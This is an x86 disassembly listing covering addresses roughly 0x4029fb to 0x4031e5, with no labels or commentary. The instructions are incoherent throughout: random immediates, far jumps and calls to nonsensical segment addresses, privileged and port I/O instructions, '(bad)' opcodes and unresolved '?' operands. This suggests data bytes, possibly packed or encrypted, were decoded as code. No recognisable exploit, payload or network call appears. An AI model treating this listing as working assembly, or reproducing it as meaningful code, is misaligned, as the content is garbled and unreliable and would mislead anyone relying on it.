  4029fb:	push   eax
  4029fc:	adc    BYTE PTR [ebp+0xfdcface],dh
  402a02:	das    
  402a03:	jmp    0x402a29
  402a05:	iret   
  402a06:	sbb    ch,BYTE PTR [esi-0x64dd6816]
  402a0c:	retf   
  402a0d:	mov    eax,0xb80c2bf1
  402a12:	pop    ss
  402a13:	rcr    BYTE PTR [edi-0x728e094c],0x18
  402a1a:	xor    dl,BYTE PTR [esi-0xf692725]
  402a20:	mov    ecx,0x141110ca
  402a25:	mov    bl,0x4d
  402a27:	add    BYTE PTR [edx-0x5c8ce16c],dh
  402a2d:	fsubr  st(2),st
  402a2f:	xchg   ebx,eax
  402a30:	or     al,0x38
  402a32:	aas    
  402a33:	scas   al,BYTE PTR es:[edi]
  402a34:	xchg   ebx,eax
  402a35:	fld    DWORD PTR [ebx-0x3d]
  402a38:	call   0x4e22:0x118da843
  402a3f:	and    BYTE PTR [ebx+0x56],0x8f
  402a43:	or     dl,dl
  402a45:	lea    esi,[ecx+0x153ec425]
  402a4b:	xlat   BYTE PTR ds:[ebx]
  402a4c:	sahf   
  402a4d:	jo     0x402a68
  402a4f:	push   edi
  402a50:	pop    esp
  402a51:	ins    BYTE PTR es:[edi],dx
  402a52:	xor    eax,0x92c017d6
  402a57:	add    esp,DWORD PTR [ebx-0x6bcc273b]
  402a5d:	cmp    esi,0xffffffbc
  402a60:	lds    ebx,FWORD PTR [ebp+0x4f]
  402a63:	aam    0xd5
  402a65:	into   
  402a66:	jnp    0x402a63
  402a68:	add    eax,0x9d60145b
  402a6d:	arpl   cx,di
  402a6f:	sub    eax,edx
  402a71:	push   cs
  402a72:	bound  esp,QWORD PTR [edx+0x7a]
  402a75:	into   
  402a76:	mov    edi,0x8552712c
  402a7b:	xchg   edx,eax
  402a7c:	dec    edx
  402a7d:	leave  
  402a7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a7f:	cdq    
  402a80:	in     al,dx
  402a81:	les    edx,FWORD PTR [eax]
  402a83:	add    eax,0xa1b77975
  402a88:	ficom  WORD PTR [eax]
  402a8a:	or     eax,0x7fcbbcdf
  402a8f:	mov    cl,0xd
  402a91:	cmp    ah,BYTE PTR [ebp+0x27]
  402a94:	mov    esp,0x16a7a5d7
  402a99:	jb     0x402aa8
  402a9b:	ret    0x104e
  402a9e:	leave  
  402a9f:	retf   0xfee
  402aa2:	call   0x144a5be1
  402aa7:	(bad)  
  402aa8:	jae    0x402a2c
  402aaa:	mov    BYTE PTR [eax-0x3b],cl
  402aad:	(bad)  
  402aae:	push   ss
  402aaf:	shr    DWORD PTR [edx],1
  402ab1:	mov    esp,0x85b14b70
  402ab6:	popf   
  402ab7:	scas   al,BYTE PTR es:[edi]
  402ab8:	ja     0x402b34
  402aba:	leave  
  402abb:	jle    0x402aee
  402abd:	shr    BYTE PTR [ecx+0x46e7f4b0],1
  402ac3:	popf   
  402ac4:	in     eax,dx
  402ac5:	out    dx,eax
  402ac6:	fiadd  DWORD PTR [esi-0x5]
  402ac9:	xor    al,0x87
  402acb:	cmp    ch,cl
  402acd:	push   esp
  402ace:	or     ah,BYTE PTR [ebx-0x63f0665b]
  402ad4:	inc    edi
  402ad5:	lods   eax,DWORD PTR ds:[esi]
  402ad6:	mov    al,0xf5
  402ad8:	int3   
  402ad9:	cmp    eax,0xc7e58919
  402ade:	nop
  402adf:	scas   eax,DWORD PTR es:[edi]
  402ae0:	xor    eax,0xc50863d1
  402ae5:	popf   
  402ae6:	or     DWORD PTR [edx],ebx
  402ae8:	lods   al,BYTE PTR ds:[esi]
  402ae9:	sbb    al,0x2b
  402aeb:	int    0x78
  402aed:	clc    
  402aee:	xchg   esp,eax
  402aef:	sbb    BYTE PTR [ebx+ecx*1-0x430b8b97],bh
  402af6:	retf   
  402af7:	fnstenv [eax+0x57]
  402afa:	enter  0x723,0xf7
  402afe:	add    dh,BYTE PTR [ecx+0x4eda0ec2]
  402b04:	xchg   ebp,edx
  402b06:	jecxz  0x402b6b
  402b08:	pop    edi
  402b09:	outs   dx,BYTE PTR ds:[esi]
  402b0a:	and    al,0x74
  402b0c:	mov    dh,0x22
  402b0e:	leave  
  402b0f:	fstp   DWORD PTR [esi+0x7a78250c]
  402b15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b16:	push   esi
  402b17:	int    0xf9
  402b19:	ss aad 0xa3
  402b1c:	int    0xb4
  402b1e:	in     al,0x3f
  402b20:	and    al,0xbb
  402b22:	inc    esi
  402b23:	cwde   
  402b24:	rcr    DWORD PTR [eax+0x437a0157],1
  402b2a:	adc    DWORD PTR ds:0x74c26cbf,edx
  402b30:	fisttp DWORD PTR [eax]
  402b32:	xor    cl,BYTE PTR [eax-0x27c385b4]
  402b38:	pop    ebp
  402b39:	retf   
  402b3a:	cmc    
  402b3b:	js     0x402b98
  402b3d:	nop
  402b3e:	mov    fs,WORD PTR [esi+0x6a]
  402b41:	dec    edi
  402b42:	cmp    DWORD PTR [eax],esi
  402b44:	rcl    DWORD PTR [ebp-0x22b4203f],cl
  402b4a:	cdq    
  402b4b:	lea    ebx,[esi]
  402b4d:	jns    0x402b13
  402b4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b50:	sbb    al,0xc5
  402b52:	popf   
  402b53:	bound  ecx,QWORD PTR [esi+0x3498106d]
  402b59:	out    dx,eax
  402b5a:	sar    BYTE PTR [edi-0x72fa225a],0xf6
  402b61:	pop    ebx
  402b62:	adc    esi,DWORD PTR [esi-0x4]
  402b65:	dec    edx
  402b66:	dec    edi
  402b67:	cmp    DWORD PTR [ebx-0x672eac65],eax
  402b6d:	inc    ebx
  402b6e:	pop    esi
  402b6f:	inc    edi
  402b70:	jle    0x402b08
  402b72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b73:	jle    0x402b4f
  402b75:	pop    es
  402b76:	pop    eax
  402b77:	or     al,0x12
  402b79:	test   dl,dl
  402b7b:	jl     0x402b80
  402b7d:	icebp  
  402b7e:	fisttp WORD PTR [edi-0x6b]
  402b81:	mov    cl,0xd6
  402b83:	ins    BYTE PTR es:[edi],dx
  402b84:	jns    0x402be0
  402b86:	lods   eax,DWORD PTR ds:[esi]
  402b87:	cbw    
  402b89:	add    BYTE PTR [esi+0x970f182],0xb0
  402b90:	cwde   
  402b91:	add    BYTE PTR [edx+edi*4],bl
  402b94:	repnz mov bh,0xce
  402b97:	cmp    BYTE PTR [esi-0x54fda495],0x28
  402b9e:	sahf   
  402b9f:	jnp    0x402c08
  402ba1:	mov    DWORD PTR [eax+0x1d72a013],edx
  402ba7:	push   edx
  402ba8:	sbb    BYTE PTR [esi+0x6c],cl
  402bab:	leave  
  402bac:	xor    eax,0xce7ea26e
  402bb1:	or     BYTE PTR [ecx-0x5e7a8f35],dh
  402bb7:	mov    al,0x8d
  402bb9:	mov    eax,ds:0xfa924b94
  402bbe:	sub    BYTE PTR [esi-0x4393c34e],al
  402bc4:	jecxz  0x402bdc
  402bc6:	sub    DWORD PTR [ebx-0x69],edx
  402bc9:	or     eax,esp
  402bcb:	pop    ebp
  402bcc:	aas    
  402bcd:	loope  0x402bd3
  402bcf:	pop    ds
  402bd0:	in     al,0x61
  402bd2:	enter  0x4a72,0xd6
  402bd6:	nop
  402bd7:	jo     0x402c08
  402bd9:	lods   eax,DWORD PTR ds:[esi]
  402bda:	xor    al,0xd7
  402bdc:	add    eax,0x6253d201
  402be1:	les    ebx,FWORD PTR [edx+0x69ea8347]
  402be7:	jg     0x402b6d
  402be9:	test   al,0xcd
  402beb:	pop    dx
  402bed:	jno    0x402c6c
  402bef:	mov    dh,0xdc
  402bf1:	mov    ch,0xc8
  402bf3:	cmp    DWORD PTR [esi+ebx*1+0x15],edx
  402bf7:	cs es test eax,0x2045840
  402bfe:	sahf   
  402bff:	add    DWORD PTR [eax+0x7],esp
  402c02:	cmp    eax,0x7899a892
  402c07:	jae    0x402c80
  402c09:	mov    edi,0x2d9f2445
  402c0e:	les    edx,FWORD PTR [edx-0x5ede9644]
  402c14:	pop    esp
  402c15:	outs   dx,BYTE PTR ds:[esi]
  402c16:	xchg   ecx,eax
  402c17:	dec    edx
  402c18:	outs   dx,DWORD PTR ds:[esi]
  402c19:	imul   ebp,DWORD PTR [esp+ebp*4],0xaeb041e
  402c20:	mov    edx,0xe3edb5d3
  402c25:	icebp  
  402c26:	pop    ss
  402c27:	rol    BYTE PTR [ebp-0x26],0x72
  402c2b:	lahf   
  402c2c:	(bad)  
  402c2d:	mov    esp,0x5db58f3e
  402c32:	jmp    0x7137:0x8a1292e7
  402c39:	push   eax
  402c3a:	mov    al,ds:0x9c588d8d
  402c3f:	int3   
  402c40:	in     eax,dx
  402c41:	pop    es
  402c42:	mov    ebx,0x113c821b
  402c47:	out    0x11,eax
  402c49:	lahf   
  402c4a:	js     0x402bd2
  402c4c:	cwde   
  402c4d:	loope  0x402c10
  402c4f:	das    
  402c50:	jae    0x402ca4
  402c52:	mov    esp,0xbc7eb665
  402c57:	mov    al,0x7f
  402c59:	shr    dh,0x98
  402c5c:	fild   QWORD PTR [edx]
  402c5f:	sub    eax,0xccfa3b63
  402c64:	dec    ecx
  402c65:	xchg   esp,eax
  402c66:	imul   ebx,DWORD PTR [edi],0xe3cbbf95
  402c6c:	add    BYTE PTR [eax+0x780d2618],bh
  402c72:	xabort 0x1
  402c75:	push   ds
  402c76:	ret    
  402c77:	data16 data16 scas al,BYTE PTR es:[edi]
  402c7a:	sahf   
  402c7b:	scas   eax,DWORD PTR es:[edi]
  402c7c:	pop    esi
  402c7d:	mov    ds:0xc4f60d0,eax
  402c82:	xlat   BYTE PTR ds:[ebx]
  402c83:	xchg   edx,eax
  402c84:	test   DWORD PTR [ecx-0x528c144a],esi
  402c8a:	pop    esi
  402c8b:	or     al,0xe6
  402c8d:	jp     0x402c9a
  402c8f:	add    al,0x2d
  402c91:	mov    esp,0x2f57df34
  402c96:	fsubrp st(1),st
  402c98:	sub    ebp,ebp
  402c9a:	lds    esi,FWORD PTR [edi]
  402c9c:	in     eax,0x69
  402c9e:	es mov dl,0x90
  402ca1:	mov    al,ds:0x99c3f5fb
  402ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ca7:	inc    edx
  402ca8:	jae    0x402d20
  402caa:	aaa    
  402cab:	out    dx,al
  402cac:	mov    ch,0xc5
  402cae:	retf   0xf508
  402cb1:	push   es
  402cb2:	jae    0x402c5d
  402cb4:	outs   dx,BYTE PTR ds:[esi]
  402cb5:	mov    al,0x46
  402cb7:	mov    bl,0x4c
  402cb9:	sbb    eax,0x582ecfed
  402cbe:	mov    ah,0x89
  402cc0:	inc    ecx
  402cc1:	adc    eax,DWORD PTR [esi]
  402cc3:	adc    ebx,DWORD PTR [esi-0x2]
  402cc6:	cli    
  402cc7:	xor    ah,BYTE PTR [ebx+0x15]
  402cca:	fst    DWORD PTR [ebx+0x38965522]
  402cd0:	mov    ?,edi
  402cd2:	mov    edx,0x22a4ab75
  402cd7:	les    edx,FWORD PTR [esi-0x66]
  402cda:	pop    ss
  402cdb:	pop    ecx
  402cdc:	cmp    al,0xa8
  402cde:	push   ebx
  402cdf:	gs test eax,0x1998300d
  402ce5:	pop    es
  402ce6:	loop   0x402d44
  402ce8:	adc    edx,0xf3396d23
  402cee:	je     0x402cae
  402cf0:	mov    eax,ds:0x83bf0cc7
  402cf5:	cdq    
  402cf6:	addr16 repnz sbb al,0xdd
  402cfa:	iret   
  402cfb:	inc    ecx
  402cfc:	mov    WORD PTR [esi+0x38],cs
  402cff:	dec    ebx
  402d00:	test   al,0x45
  402d02:	jmp    0x6272:0xf0f2158b
  402d09:	push   ss
  402d0a:	stc    
  402d0b:	test   DWORD PTR [ecx+ebx*1+0x6],esp
  402d0f:	call   0xb00aafb2
  402d14:	jmp    0x402d4a
  402d16:	outs   dx,DWORD PTR ds:[esi]
  402d17:	sbb    BYTE PTR [eax-0x34],dl
  402d1a:	xchg   ah,dh
  402d1c:	xchg   BYTE PTR [edx-0x43f8326c],cl
  402d22:	add    cl,BYTE PTR [edi]
  402d24:	out    0xa,eax
  402d26:	retf   0x826e
  402d29:	mov    DWORD PTR [edi],ebx
  402d2b:	gs push eax
  402d2d:	xor    edx,esi
  402d2f:	fld    st(4)
  402d31:	fcmovnu st,st(3)
  402d33:	mov    eax,es
  402d35:	retf   0x58fd
  402d38:	aam    0xde
  402d3a:	inc    ebx
  402d3b:	jo     0x402cc0
  402d3d:	pop    edx
  402d3e:	sub    DWORD PTR ds:0xb0152745,esp
  402d44:	pop    es
  402d45:	inc    ebx
  402d46:	sub    al,0xf2
  402d48:	call   0x709aabfe
  402d4d:	test   DWORD PTR [ecx],0x3cd27305
  402d53:	and    BYTE PTR [eax-0x48fb5fbf],dl
  402d59:	mov    esp,DWORD PTR [edi]
  402d5b:	dec    esi
  402d5c:	inc    bl
  402d5e:	js     0x402ced
  402d60:	inc    eax
  402d61:	in     eax,dx
  402d62:	inc    ebp
  402d63:	(bad)  
  402d64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d65:	inc    ebp
  402d66:	jmp    0x694d:0x29e38ce0
  402d6d:	cmc    
  402d6e:	mov    bl,0x61
  402d70:	dec    edx
  402d71:	push   ds
  402d72:	jne    0x402d0d
  402d74:	mov    edx,0xfad4bf6b
  402d79:	jnp    0x402d42
  402d7b:	lods   al,BYTE PTR ds:[esi]
  402d7c:	ret    0xf69e
  402d7f:	pop    DWORD PTR [edx+esi*1+0x4f7cf661]
  402d86:	sti    
  402d87:	push   edx
  402d88:	mov    BYTE PTR [ecx-0xe],dh
  402d8b:	dec    ebp
  402d8c:	lahf   
  402d8d:	sub    DWORD PTR [edx+edi*8-0x2c],edi
  402d91:	fimul  DWORD PTR [esi-0x4c]
  402d94:	sbb    edi,ebx
  402d96:	pop    cx
  402d98:	repnz or ebx,DWORD PTR [eax-0x7b]
  402d9c:	push   ds
  402d9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d9e:	jns    0x402db8
  402da0:	mov    al,ds:0x6a4cfd17
  402da6:	xor    DWORD PTR [ecx-0xdf447a3],edi
  402dac:	sub    eax,0x48fba510
  402db1:	into   
  402db2:	jp     0x402dd4
  402db4:	(bad)  
  402db5:	mov    ch,0x8d
  402db7:	leave  
  402db8:	gs loopne 0x402d5e
  402dbb:	and    ch,BYTE PTR [ecx-0x10c65227]
  402dc1:	pop    edx
  402dc2:	xor    dh,ah
  402dc4:	pop    edx
  402dc5:	ret    0x2386
  402dc8:	clc    
  402dc9:	retf   
  402dca:	mov    ds:0x480b5c8d,eax
  402dcf:	jp     0x402dd1
  402dd1:	add    ecx,DWORD PTR [ebp-0x7a]
  402dd4:	bound  esp,QWORD PTR [esi]
  402dd6:	mov    ebp,0x63340c8d
  402ddb:	cmp    ebx,esp
  402ddd:	test   al,0x88
  402ddf:	inc    esp
  402de0:	addr16 jb 0x402df2
  402de3:	jnp    0x402db8
  402de5:	sub    esp,DWORD PTR [edx]
  402de7:	push   0xa5f07b71
  402dec:	cmp    BYTE PTR [ebx+0x7a],ch
  402def:	sbb    eax,0xc555cf57
  402df4:	inc    ecx
  402df5:	fmul   QWORD PTR [esi+0x429011e]
  402dfb:	sub    al,0xd8
  402dfd:	sbb    BYTE PTR ds:0x6e5485a0,cl
  402e03:	or     eax,0xc7e039f4
  402e08:	loopne 0x402e53
  402e0a:	push   ebp
  402e0b:	push   ecx
  402e0c:	jne    0x402e76
  402e0e:	jle    0x402e13
  402e10:	rol    ch,1
  402e12:	jbe    0x402e89
  402e14:	lds    edi,FWORD PTR [edx]
  402e16:	push   ss
  402e17:	icebp  
  402e18:	fs je  0x402da6
  402e1b:	mov    dh,BYTE PTR [eax+0x346560d8]
  402e21:	test   BYTE PTR [edx+0x58680693],dl
  402e27:	arpl   WORD PTR [ebp+0x4f221f3],ax
  402e2d:	es xor eax,0xe39c8a08
  402e33:	sti    
  402e34:	xor    al,0x29
  402e36:	mov    ch,0x58
  402e38:	hlt    
  402e39:	aad    0xf1
  402e3b:	ja     0x402eb4
  402e3d:	mov    eax,0x26a57d4b
  402e42:	fs push ecx
  402e44:	dec    esi
  402e45:	call   0x5c3b:0x4d489f93
  402e4c:	push   es
  402e4d:	pop    esp
  402e4e:	popa   
  402e4f:	aaa    
  402e50:	out    0xc4,eax
  402e52:	rcr    BYTE PTR [ebp+0x27],0x19
  402e56:	sbb    bh,BYTE PTR ds:0x6fc8f99
  402e5c:	sbb    al,ch
  402e5e:	rol    BYTE PTR [ebx+eiz*2-0x5322ad7e],0x5d
  402e66:	xchg   esp,eax
  402e67:	mov    esp,0xd0b2faf
  402e6c:	in     al,dx
  402e6d:	add    ebx,ebx
  402e6f:	hlt    
  402e70:	loopne 0x402e29
  402e72:	shr    DWORD PTR [ebx-0x72048d5e],cl
  402e78:	sbb    bl,BYTE PTR [ebx]
  402e7a:	ins    DWORD PTR es:[edi],dx
  402e7b:	jb     0x402e5c
  402e7d:	adc    dl,BYTE PTR [ebx+eax*8-0x68]
  402e81:	mov    DWORD PTR [edi+ebp*1-0x2319162f],edi
  402e88:	imul   ecx,DWORD PTR [edx-0x3b4dff62],0x9b5182c1
  402e92:	data16 mov al,0xe6
  402e95:	and    BYTE PTR [ebp-0x21],ch
  402e98:	pop    esp
  402e99:	add    DWORD PTR [eax],edx
  402e9b:	das    
  402e9c:	dec    edx
  402e9d:	stos   DWORD PTR es:[edi],eax
  402e9e:	pop    esp
  402e9f:	inc    ebp
  402ea0:	add    eax,0xebb4e2c4
  402ea5:	push   esp
  402ea6:	sub    ebx,DWORD PTR [ebx+0x36]
  402ea9:	mov    esp,edi
  402eab:	stos   DWORD PTR es:[edi],eax
  402eac:	pop    ebx
  402ead:	push   cs
  402eae:	mov    al,0x83
  402eb0:	sbb    BYTE PTR [ecx+ebx*4],bh
  402eb3:	sar    DWORD PTR [esi-0x37608706],0x1d
  402eba:	inc    edx
  402ebb:	imul   ebx,DWORD PTR ds:0x3893fb73,0xb608be19
  402ec5:	mov    ax,ds:0x58cc798
  402ecb:	pop    ecx
  402ecc:	jmp    0x638c:0x400c4df2
  402ed3:	out    0xd1,eax
  402ed5:	pop    ebp
  402ed6:	fldcw  WORD PTR [ebx+0x5d6c7e10]
  402edc:	repnz iret 
  402ede:	clc    
  402edf:	push   edx
  402ee0:	cmp    BYTE PTR [ebp-0x27],dl
  402ee3:	pop    eax
  402ee4:	lods   al,BYTE PTR ds:[esi]
  402ee5:	sbb    al,0x6
  402ee7:	in     al,dx
  402ee8:	adc    eax,0x2ceebe5e
  402eed:	inc    esi
  402eee:	jl     0x402f33
  402ef0:	inc    edx
  402ef1:	sahf   
  402ef2:	out    0xc,al
  402ef4:	test   al,0xd8
  402ef6:	and    BYTE PTR [eax-0x5cae931c],0x1e
  402efd:	js     0x402ec8
  402eff:	jle    0x402f11
  402f01:	sbb    al,0x8b
  402f03:	pop    ss
  402f04:	hlt    
  402f05:	cmp    DWORD PTR [edx],0xed631d0e
  402f0b:	rcl    DWORD PTR [esp+edx*2],1
  402f0e:	dec    ebp
  402f0f:	xchg   esp,eax
  402f10:	sbb    al,0x99
  402f12:	mov    dl,0x8a
  402f14:	inc    ebp
  402f15:	mov    eax,ds:0x223d9c15
  402f1a:	dec    edi
  402f1b:	ins    BYTE PTR es:[edi],dx
  402f1c:	rcr    BYTE PTR [eax-0xf],0x8c
  402f20:	pop    es
  402f21:	fwait
  402f22:	or     DWORD PTR [ebx+0x7ef8b4cd],edi
  402f28:	add    eax,0x5e42b478
  402f2d:	sbb    edx,ebp
  402f2f:	popa   
  402f30:	test   DWORD PTR [eax],0x410885d5
  402f36:	cs out dx,al
  402f38:	mov    dl,0x80
  402f3a:	enter  0x2309,0x10
  402f3e:	dec    esp
  402f3f:	sub    DWORD PTR [eax],esp
  402f41:	cmp    DWORD PTR [ebx+0x43],0xffffffe2
  402f45:	jns    0x402f8a
  402f47:	xor    al,0x5e
  402f49:	jbe    0x402f96
  402f4b:	or     al,BYTE PTR [edx-0x779b4bfd]
  402f51:	pop    ecx
  402f52:	popa   
  402f53:	xor    DWORD PTR [esi-0x69a5d550],ebx
  402f59:	(bad)  
  402f5a:	imul   ebp,DWORD PTR [edi],0x251fc8c1
  402f60:	sahf   
  402f61:	jle    0x402f35
  402f63:	es (bad) 
  402f65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f66:	xlat   BYTE PTR ds:[ebx]
  402f67:	sub    cl,BYTE PTR [esi-0x3b6365ac]
  402f6d:	mov    DWORD PTR [ebp-0x131e229d],eax
  402f73:	gs fwait
  402f75:	test   al,0xf7
  402f77:	ret    
  402f78:	sub    eax,0x8d818233
  402f7d:	aaa    
  402f7e:	fld    DWORD PTR [ebp+0x745c936d]
  402f84:	mov    bl,0x21
  402f86:	ret    0x2562
  402f89:	fimul  DWORD PTR [ebx+0x68]
  402f8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f8d:	(bad)  
  402f8e:	(bad)  
  402f8f:	mov    WORD PTR [ebx-0x1dbed529],?
  402f95:	stc    
  402f96:	cli    
  402f97:	nop
  402f98:	retf   
  402f99:	sbb    BYTE PTR [eax],dh
  402f9b:	xor    DWORD PTR [ecx-0x3],edi
  402f9e:	sbb    ebx,esp
  402fa0:	test   al,0x3b
  402fa2:	or     al,0xa
  402fa4:	dec    ebx
  402fa5:	xchg   edx,eax
  402fa6:	in     eax,dx
  402fa7:	mov    edi,0xd5ff8813
  402fac:	push   ebp
  402fad:	sub    BYTE PTR [edi+0x62fbe7af],0x9c
  402fb4:	ins    BYTE PTR es:[edi],dx
  402fb5:	jge    0x402fd6
  402fb7:	sbb    DWORD PTR [eax],0x59
  402fba:	mov    eax,eax
  402fbc:	lods   eax,DWORD PTR ds:[esi]
  402fbd:	in     eax,dx
  402fbe:	cmp    DWORD PTR [esi-0x5c6b10c5],ebp
  402fc4:	dec    ebx
  402fc5:	jbe    0x402f9a
  402fc7:	in     al,dx
  402fc8:	jnp    0x402f8f
  402fca:	sbb    BYTE PTR [eax-0x3a],bl
  402fcd:	fidiv  DWORD PTR [edx-0x61534196]
  402fd3:	test   al,0xdc
  402fd5:	mov    eax,ds:0xf1f204c2
  402fda:	hlt    
  402fdb:	mov    esp,0x7f2426a5
  402fe0:	not    BYTE PTR [ebp+0x28789323]
  402fe6:	and    eax,0xd026ca17
  402feb:	push   ecx
  402fec:	pop    esp
  402fed:	shr    DWORD PTR [ebx],cl
  402fef:	mov    eax,0xf6c4f55b
  402ff4:	cli    
  402ff5:	push   ecx
  402ff6:	outs   dx,BYTE PTR ds:[esi]
  402ff7:	mov    ebx,0xe404f540
  402ffc:	mov    ss,WORD PTR [edi+ecx*1+0x68d95cb4]
  403003:	mov    esp,0xe81d3772
  403008:	cs js  0x402faa
  40300b:	xchg   DWORD PTR [edi-0x64f9fb8a],ebx
  403011:	fidiv  WORD PTR [edi-0x73]
  403014:	or     DWORD PTR [ebx],esp
  403016:	call   0x57a3fa5a
  40301b:	sahf   
  40301c:	js     0x40304c
  40301e:	es call 0x677d:0xe7103157
  403026:	test   eax,0xaaf43efc
  40302b:	repnz ins BYTE PTR es:[edi],dx
  40302d:	add    DWORD PTR [edi+0xed9c0d6],ecx
  403033:	iret   
  403034:	xchg   ebx,eax
  403035:	cmp    DWORD PTR [edx+0x74],ecx
  403038:	rcl    BYTE PTR [edi+0x6bffc54f],cl
  40303e:	stc    
  40303f:	dec    BYTE PTR [esi]
  403041:	cs add eax,0x1d5f0e2f
  403047:	jb     0x403006
  403049:	push   ss
  40304a:	in     eax,0x9
  40304c:	mov    esp,0x41da8839
  403051:	mov    ebp,0xa045a7a
  403056:	lds    esi,FWORD PTR [esi+0x7c3794dd]
  40305c:	popa   
  40305d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40305e:	sbb    esp,DWORD PTR [esi+0x31]
  403061:	sub    DWORD PTR [ecx+0x69],edx
  403064:	pop    eax
  403065:	scas   al,BYTE PTR es:[edi]
  403066:	sbb    BYTE PTR ds:0xcf3b6302,0xf0
  40306d:	xor    eax,0x91b13fb8
  403072:	add    ebp,DWORD PTR [edi+0x25]
  403075:	jmp    0x403099
  403077:	jecxz  0x4030f8
  403079:	mov    ecx,0x74c7cc82
  40307e:	imul   edx,DWORD PTR [eax+0x54407c95],0x56
  403085:	(bad)
  403088:	call   0xb522:0xaa89058d
  40308f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403090:	xchg   ecx,eax
  403091:	jns    0x4030db
  403093:	loopne 0x40310c
  403095:	mov    ch,0x4d
  403097:	xlat   BYTE PTR ds:[ebx]
  403098:	push   esp
  403099:	in     eax,dx
  40309a:	cmc    
  40309b:	iret   
  40309c:	fcmovnb st,st(3)
  40309e:	jbe    0x403090
  4030a0:	inc    ecx
  4030a1:	bound  ebx,QWORD PTR [ebp-0xdc3e4a0]
  4030a7:	sar    DWORD PTR [ebx+0x3b],cl
  4030aa:	mov    cl,0x99
  4030ac:	cmp    BYTE PTR [eax+0x54],cl
  4030af:	ja     0x403057
  4030b1:	leave  
  4030b2:	jge    0x40312a
  4030b4:	popa   
  4030b5:	adc    ah,al
  4030b7:	ja     0x4030ad
  4030b9:	fisubr DWORD PTR [edx]
  4030bb:	sahf   
  4030bc:	mov    ebx,DWORD PTR [esi+ebx*2]
  4030bf:	aam    0x95
  4030c1:	xchg   ebp,eax
  4030c2:	loopne 0x40310b
  4030c4:	js     0x403116
  4030c6:	and    DWORD PTR [ecx],esi
  4030c8:	(bad)  
  4030c9:	push   edi
  4030ca:	xchg   ecx,eax
  4030cb:	das    
  4030cc:	nop
  4030cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030ce:	(bad)  
  4030cf:	push   edi
  4030d0:	fwait
  4030d1:	adc    edx,DWORD PTR [eax-0x5e3f7381]
  4030d7:	cli    
  4030d8:	stc    
  4030d9:	and    ch,BYTE PTR fs:[eax]
  4030dc:	daa    
  4030dd:	adc    al,0x65
  4030df:	push   ebx
  4030e0:	or     DWORD PTR [edi+0x78],0x49
  4030e4:	mov    ebx,0x68b2f0ee
  4030e9:	push   cs
  4030ea:	xor    bh,cl
  4030ec:	xchg   edx,eax
  4030ed:	fdiv   QWORD PTR [esp+esi*2+0x4c]
  4030f1:	in     al,0x9
  4030f3:	mov    cl,dh
  4030f5:	adc    al,0xfe
  4030f7:	push   edi
  4030f8:	cs mov bl,0x67
  4030fc:	mov    al,BYTE PTR [eax+edi*4+0x4b]
  403100:	es sahf 
  403102:	mov    eax,0xd4d9f407
  403107:	mov    eax,ds:0x2c25512d
  40310c:	ficom  WORD PTR ds:0x87feb0ff
  403112:	jp     0x40312e
  403114:	xchg   esp,eax
  403115:	inc    eax
  403116:	sub    esi,esp
  403118:	xor    al,BYTE PTR [esi-0x63f3674d]
  40311e:	popf   
  40311f:	add    esi,DWORD PTR [eax-0x4a390f10]
  403125:	idiv   DWORD PTR [eax]
  403127:	inc    ebp
  403128:	repnz mov cl,0x8
  40312b:	mov    edx,0x31b14f0d
  403130:	loop   0x4030df
  403132:	push   cs
  403133:	out    dx,al
  403134:	adc    ah,BYTE PTR [ebx-0x5a]
  403137:	add    esi,ecx
  403139:	rol    ah,cl
  40313b:	xchg   edi,eax
  40313c:	sub    eax,0xe0d7c003
  403141:	inc    eax
  403142:	test   bh,ch
  403144:	push   ecx
  403145:	xor    al,BYTE PTR [esi+ebp*1-0x3aa9fd84]
  40314c:	jne    0x4030e3
  40314e:	and    bl,cl
  403150:	scas   eax,DWORD PTR es:[edi]
  403151:	sar    DWORD PTR [ebp+0x31],0x42
  403155:	mov    edx,0xbc63bdb9
  40315a:	scas   al,BYTE PTR es:[edi]
  40315b:	imul   esi,DWORD PTR [edi-0xe],0x3f805ece
  403162:	pop    ebp
  403163:	mov    WORD PTR ds:0xd26051d7,?
  403169:	add    DWORD PTR [ebp-0x348bc5d7],esi
  40316f:	adc    DWORD PTR [edi],esp
  403171:	out    dx,al
  403172:	popf   
  403173:	sbb    ah,cl
  403175:	lock in al,dx
  403177:	mov    bh,0xe6
  403179:	or     BYTE PTR [edx+0x483ef83a],dh
  40317f:	mov    edx,0x70384d60
  403184:	outs   dx,BYTE PTR ds:[esi]
  403185:	jmp    0x3ab4:0x6f2374fe
  40318c:	adc    eax,0x8427db45
  403191:	(bad)  
  403192:	in     eax,dx
  403193:	idiv   DWORD PTR [eax-0x7619d00c]
  403199:	mov    ds:0xbfb466f2,al
  40319e:	pop    esi
  40319f:	and    al,0x32
  4031a1:	mov    cs:0xb83547c,al
  4031a7:	xor    al,0x21
  4031a9:	out    dx,eax
  4031aa:	outs   dx,DWORD PTR ds:[esi]
  4031ab:	test   bh,dh
  4031ad:	fidiv  DWORD PTR [esi]
  4031af:	cmp    BYTE PTR [eax+edx*8+0x73],ch
  4031b3:	bound  edx,QWORD PTR [ebx+ebp*4-0xe3981f7]
  4031ba:	cwde   
  4031bb:	sub    eax,0x1b83ac2e
  4031c0:	cdq    
  4031c1:	jecxz  0x4031aa
  4031c3:	cmp    DWORD PTR [eax],ebx
  4031c5:	push   ebp
  4031c6:	mov    edi,DWORD PTR [ebp-0x9]
  4031c9:	cmc    
  4031ca:	or     eax,DWORD PTR [edi-0x7174614a]
  4031d0:	fiadd  DWORD PTR [ecx+0x779678da]
  4031d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031d7:	out    0x90,al
  4031d9:	fstp   QWORD PTR [ebp-0x7]
  4031dc:	mov    BYTE PTR [ebx+0x26],bh
  4031df:	pop    es
  4031e0:	retf   0x2c8f
  4031e3:	mov    bh,0xd1
  4031e5:	dec    ebx
